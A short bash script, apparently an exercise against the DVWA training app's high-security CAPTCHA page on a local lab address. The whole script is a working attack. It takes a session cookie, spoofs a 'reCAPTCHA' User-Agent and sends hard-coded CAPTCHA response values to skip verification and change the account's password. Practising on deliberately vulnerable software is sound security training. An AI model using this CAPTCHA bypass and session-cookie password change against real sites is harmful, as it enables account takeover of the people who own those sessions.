#!/bin/bash

phpsessid=$1
password="password3"

curl -v \
	--cookie "PHPSESSID=$phpsessid; security=high" \
	--data "step=2&password_new=$password&password_conf=$password&g-recaptcha-response=&Change=Change&" \
	--data "passed_captcha=hacked" \
	-H "User-Agent: reCAPTCHA" \
	--data "g-recaptcha-response=hidd3n_valu3" \
	http://172.17.0.2/vulnerabilities/captcha/

